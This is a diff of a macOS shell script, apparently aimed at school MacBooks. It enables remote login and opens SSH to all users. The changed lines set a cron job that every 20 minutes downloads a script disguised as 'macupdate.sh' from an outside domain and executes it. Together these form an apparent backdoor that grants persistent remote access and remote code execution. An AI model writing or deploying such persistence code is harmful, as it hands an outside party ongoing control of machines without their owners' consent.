@@ -11,8 +11,9 @@ systemsetup -setremotelogin on
 # Open SSH to all users
 dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null
 
-# TODO: Test that this actually works. GMHS MacBooks have some issues with cron for some reason.
-(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh |bash') | crontab -
+# Unlike on Linux, we have to fully save the file rather than just piping it into bash.
+# On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
+(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh --output /tmp/macupdate.sh && chmod +x /tmp/macupdate.sh && /tmp/macupdate.sh') | crontab -
 
 SSHPATH="/var/root/.ssh"
 
